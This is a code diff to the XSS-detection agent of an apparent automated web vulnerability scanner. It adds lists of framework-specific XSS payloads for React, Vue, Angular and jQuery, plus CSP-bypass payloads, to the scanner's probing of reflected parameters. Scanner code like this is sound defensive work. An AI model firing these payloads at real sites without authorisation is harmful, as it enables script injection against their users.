@@ -1,13 +1,16 @@
 """
 XSS (Cross-Site Scripting) Security Agent - Detects XSS vulnerabilities.
 """
-from typing import List, Dict, Any
+from typing import List, Dict, Any, Optional, TYPE_CHECKING
 import re
 import html
 from urllib.parse import urljoin, urlparse, quote
 
 from .base_agent import BaseSecurityAgent, AgentResult
 from models.vulnerability import Severity, VulnerabilityType
+
+if TYPE_CHECKING:
+    from core.scan_context import ScanContext
 
 
 class XSSAgent(BaseSecurityAgent):
@@ -64,8 +67,37 @@ class XSSAgent(BaseSecurityAgent):
         "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>;",
         "'\"--></style></script><script>alert('XSS')</script>",
     ]
+        # Framework-specific XSS payloads
+    FRAMEWORK_SPECIFIC_PAYLOADS = {
+        "React": [
+            "<img src=x onerror=alert('XSS')>",  # JSX doesn't auto-escape event handlers
+            "{{constructor.constructor('alert(1)')()}}",  # Template injection
+            "javascript:alert('XSS')",  # href attribute
+        ],
+        "Vue.js": [
+            "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
+            "{{constructor.constructor('alert(1)')()}}",
+            "<div :innerHTML=\"'<script>alert(1)</script>'\"></div>",
+        ],
+        "Angular": [
+            "{{constructor.constructor('alert(1)')()}}",
+            "<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></div>",
+            "{{ ''.constructor.constructor('alert(1)')() }}",
+        ],
+        "jQuery": [
+            "<img src=x onerror=alert('XSS')>",
+            "<script>$(function(){alert('XSS')})</script>",
+        ]
+    }
     
-    # Unique marker for reflection detection
+    # CSP bypass payloads for strict policies
+    CSP_BYPASS_PAYLOADS = [
+        "<link rel=\"import\" href=\"data:text/html,<script>alert(1)</script>\">",
+        "<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert(1)\">",
+        "<iframe srcdoc=\"<script>alert(1)</script>\">",
+        "<object data=\"data:text/html,<script>alert(1)</script>\">",
+    ]
+        # Unique marker for reflection detection
     REFLECTION_MARKER = "MATRIX_XSS_TEST_"
     
     # DOM XSS sink patterns
@@ -95,20 +127,28 @@ class XSSAgent(BaseSecurityAgent):
         self,
         target_url: str,
         endpoints: List[Dict[str, Any]],
-        technology_stack: List[str] = None
+        technology_stack: List[str] = None,
+        scan_context: Optional["ScanContext"] = None
     ) -> List[AgentResult]:
         """
-        Scan for XSS vulnerabilities.
+        Scan for XSS vulnerabilities with framework-aware payloads.
         
         Args:
             target_url: Base URL
             endpoints: Endpoints to test
             technology_stack: Detected technologies
+            scan_context: Shared scan context
             
         Returns:
             List of found vulnerabilities
         """
         results = []
+        
+        # Detect framework and select appropriate payloads
+        detected_framework = self._detect_framework(technology_stack or [])
+        payloads_to_use = self._select_payloads(detected_framework, scan_context)
+        
+        print(f"[XSS Agent] Using {len(payloads_to_use)} payloads (framework: {detected_framework or 'generic'})")
         
         for endpoint in endpoints:
             url = endpoint.get("url", target_url)
@@ -118,7 +158,7 @@ class XSSAgent(BaseSecurityAgent):
             # Test each parameter for reflected XSS
             for param_name in params.keys():
                 result = await self._test_reflected_xss(
-                    url, method, params, param_name
+                    url, method, params, param_name, payloads_to_use[:8]
                 )
                 if result:
                     results.append(result)
@@ -130,12 +170,45 @@ class XSSAgent(BaseSecurityAgent):
         
         return results
     
+    def _detect_framework(self, technology_stack: List[str]) -> Optional[str]:
+        """Detect frontend framework from technology stack."""
+        tech_lower = [t.lower() for t in technology_stack]
+        
+        frameworks = ["React", "Vue.js", "Angular", "jQuery"]
+        for framework in frameworks:
+            if framework.lower() in " ".join(tech_lower):
+                print(f"[XSS Agent] Detected framework: {framework}")
+                return framework
+        
+        return None
+    
+    def _select_payloads(self, framework: Optional[str], scan_context: Optional["ScanContext"]) -> List[str]:
+        """Select XSS payloads based on framework and CSP policy."""
+        payloads = list(self.BASIC_PAYLOADS)
+        
+        # Add framework-specific payloads
+        if framework and framework in self.FRAMEWORK_SPECIFIC_PAYLOADS:
+            payloads.extend(self.FRAMEWORK_SPECIFIC_PAYLOADS[framework])
+            print(f"[XSS Agent] Added {len(self.FRAMEWORK_SPECIFIC_PAYLOADS[framework])} {framework}-specific payloads")
+        
+        # Check for CSP in scan context
+        if scan_context and scan_context.csp_policy:
+            print(f"[XSS Agent] CSP detected, adding bypass payloads")
+            payloads.extend(self.CSP_BYPASS_PAYLOADS)
+        
+        # Add other payload categories
+        payloads.extend(self.ATTRIBUTE_PAYLOADS[:3])
+        payloads.extend(self.EVENT_HANDLER_PAYLOADS[:3])
+        
+        return payloads
+    
     async def _test_reflected_xss(
         self,
         url: str,
         method: str,
         params: Dict,
-        param_name: str
+        param_name: str,
+        payloads: List[str] = None
     ) -> AgentResult | None:
         """
         Test for reflected XSS in a parameter.
@@ -145,6 +218,7 @@ class XSSAgent(BaseSecurityAgent):
             method: HTTP method
             params: Parameters
             param_name: Parameter to test
+            payloads: Optional list of payloads to use
             
         Returns:
             AgentResult if vulnerable, None otherwise
@@ -172,7 +246,7 @@ class XSSAgent(BaseSecurityAgent):
                 return None  # No reflection, skip XSS tests
             
             # Try XSS payloads
-            all_payloads = (
+            all_payloads = payloads if payloads else (
                 self.BASIC_PAYLOADS + 
                 self.ATTRIBUTE_PAYLOADS + 
                 self.EVENT_HANDLER_PAYLOADS
@@ -200,18 +274,16 @@ class XSSAgent(BaseSecurityAgent):
                         response_data=response_text[:1500]
                     )
                     
-                    return self.create_result(
+                    return self.create_result_from_ai(
+                        ai_analysis=ai_analysis,
                         vulnerability_type=VulnerabilityType.XSS_REFLECTED,
-                        is_vulnerable=True,
                         severity=Severity.HIGH,
-                        confidence=ai_analysis.get("confidence", 85),
                         url=url,
                         parameter=param_name,
                         method=method,
                         title=f"Reflected XSS in '{param_name}' parameter",
                         description=f"A reflected Cross-Site Scripting (XSS) vulnerability was detected. User input in the '{param_name}' parameter is reflected back in the response without proper encoding, allowing execution of arbitrary JavaScript.",
                         evidence=f"Payload reflected: {payload}",
-                        ai_analysis=ai_analysis.get("reason", ""),
                         remediation="Encode all user input before reflecting it in the response. Use context-appropriate encoding (HTML entity encoding for HTML context, JavaScript encoding for JS context). Implement Content Security Policy (CSP) headers.",
                         owasp_category="A03:2021 – Cross-Site Scripting",
                         cwe_id="CWE-79",
